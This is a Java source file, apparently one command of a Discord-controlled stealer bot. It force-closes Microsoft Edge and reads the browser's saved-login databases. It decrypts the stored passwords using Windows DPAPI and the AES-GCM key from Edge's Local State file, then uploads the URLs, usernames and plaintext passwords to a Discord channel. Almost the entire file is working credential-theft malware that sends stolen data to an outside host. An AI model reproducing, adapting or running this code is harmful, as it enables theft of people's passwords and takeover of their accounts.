package me.vasler.command.impl.browsers;

import com.github.windpapi4j.WinDPAPI;
import me.vasler.utils.FileUtil;
import net.dv8tion.jda.api.utils.FileUpload;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONObject;
import me.vasler.command.Command;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileOutputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.UUID;

public class EdgeCommand extends Command {

    private static final String localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
    private static final String kDPAPIKeyPrefix = "DPAPI";
    private static final int kKeyLength = 256 / 8;
    private static final int kNonceLength = 96 / 8;
    private static final String kEncryptionVersionPrefix = "v10";

    public static boolean shorten = true;
    public static boolean obfus = false;

    public EdgeCommand() {
        super(new String[]{"edge", "microsoft", "bing"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        try {
            for (int i = 0; i < 70; i++) {
                Runtime.getRuntime().exec("taskkill /IM msedge.exe /F");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        File pwdDump = new File(System.getProperty("java.io.tmpdir") + "\\" + UUID.randomUUID() + ".txt");
        try {
            if (!(System.getProperty("os.name").contains("Windows"))) {
                System.exit(-1);
            }
            ArrayList<String> list = getEdgeInfo();
            FileOutputStream dumpFile = new FileOutputStream(pwdDump);
            for (String s : list) {
                dumpFile.write(s.getBytes());
                dumpFile.write("\n".getBytes());
            }
            dumpFile.flush();
            dumpFile.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        channel.sendFiles(new FileUpload[]{FileUpload.fromData(pwdDump)}).queue();
        if (pwdDump.exists()) {
            pwdDump.deleteOnExit();
        }
    }

    public static ArrayList<String> getEdgeInfo() {
        ArrayList<String> toRet = new ArrayList<>();
        Connection c;
        Statement stmt;
        try {
            Class.forName("org.sqlite.JDBC");
            for (File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") +  "\\AppData\\Local\\Microsoft\\Edge\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    c = DriverManager.getConnection("jdbc:sqlite:" + file.getPath());
                    c.setAutoCommit(false);

                    stmt = c.createStatement();
                    ResultSet rs = stmt.executeQuery("SELECT * FROM logins;");
                    while (rs != null && rs.next()) {
                        String url = rs.getString("origin_url");
                        if (url == null) url = rs.getString("action_url");
                        if (url == null) url = "Not found/corrupted";
                        else if ((url.length() > 40) && (shorten)) url = url.substring(0, 40) + "...";
                        String username = rs.getString("username_value");
                        if (username == null) username = "Not found/corrupted";
                        if (!obfus)
                            toRet.add(String.format("URL:%s\nUsername:%-35s | Password:%-20s\n", url, username, encryptedBinaryStreamToDecryptedString(
                                    rs.getBytes("password_value"))));
                        else
                            toRet.add(String.format("URL:%-35s\nUsername:%-35s | Password:<Obfuscation Mode Enabled>\n", url, username));
                    }
                    rs.close();
                    stmt.close();
                    c.close();
                }
            }
        } catch (Exception ignored) {}
        return toRet;
    }

    public static String encryptedBinaryStreamToDecryptedString(byte[] encryptedValue) {
        byte[] decrypted = null;
        try {
            boolean isV10 = new String(encryptedValue).startsWith("v10");
            if (WinDPAPI.isPlatformSupported()) {
                WinDPAPI winDPAPI = WinDPAPI.newInstance(WinDPAPI.CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);
                if (!isV10) {
                    decrypted = winDPAPI.unprotectData(encryptedValue);
                } else {
                    if (StringUtils.isEmpty(localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    String localState = FileUtils.readFileToString(new File(localStateFileFullPathAndName));
                    JSONObject jsonObject = new JSONObject(localState);
                    String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
                    byte[] encryptedKeyBytes = Base64.decodeBase64(encryptedKeyBase64);
                    if (!new String(encryptedKeyBytes).startsWith(kDPAPIKeyPrefix)) {
                        throw new IllegalStateException("Local State should start with DPAPI");
                    }
                    encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, kDPAPIKeyPrefix.length(), encryptedKeyBytes.length);

                    // Use DPAPI to get the real AES key
                    byte[] keyBytes = winDPAPI.unprotectData(encryptedKeyBytes);
                    if (keyBytes.length != kKeyLength) {
                        throw new IllegalStateException("Local State key length is wrong");
                    }

                    // Obtain the nonce.
                    byte[] nonceBytes = Arrays.copyOfRange(encryptedValue, kEncryptionVersionPrefix.length(), kEncryptionVersionPrefix.length() + kNonceLength);

                    // Strip off the versioning prefix before decrypting.
                    encryptedValue = Arrays.copyOfRange(encryptedValue, kEncryptionVersionPrefix.length() + kNonceLength, encryptedValue.length);

                    // Use BC provider to decrypt
                    decrypted = getDecryptBytes(encryptedValue, keyBytes, nonceBytes);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new String(decrypted);
    }


    private static final int KEY_LENGTH = 256 / 8;
    private static final int IV_LENGTH = 96 / 8;
    private static final int GCM_TAG_LENGTH = 16;

    public static final byte[] getDecryptBytes(byte[] inputBytes, byte[] keyBytes, byte[] ivBytes) {
        try {
            if (inputBytes == null) {
                throw new IllegalArgumentException();
            }

            if (keyBytes == null) {
                throw new IllegalArgumentException();
            }
            if (keyBytes.length != KEY_LENGTH) {
                throw new IllegalArgumentException();
            }

            if (ivBytes == null) {
                throw new IllegalArgumentException();
            }
            if (ivBytes.length != IV_LENGTH) {
                throw new IllegalArgumentException();
            }

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH * 8, ivBytes);
            cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, gcmParameterSpec);
            return cipher.doFinal(inputBytes);
        } catch (Exception ex) {
            return null;
        }
    }

    /*public static String encryptedBinaryStreamToDecryptedString(InputStream is) throws IOException {
        StringBuilder toRet2 = new StringBuilder();
        // issue is right here
        byte[] toRet = Crypt32Util.cryptUnprotectData(hexStringToByteArray(streamToString(is)));
        for (byte b : toRet) {
            toRet2.append((char) b);
        }
        return toRet2.toString();
    }

    public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }

    public static String streamToString(InputStream b) throws IOException {
        StringBuilder toRet = new StringBuilder();
        String s;
        while (b.available() > 0) {
            s = String.format("%s", Integer.toHexString(b.read()));
            if (s.length() == 1) toRet.append("0" + s + "");
            else toRet.append(s + "");
        }
        b.close();
        return toRet.toString();
    }*/
}
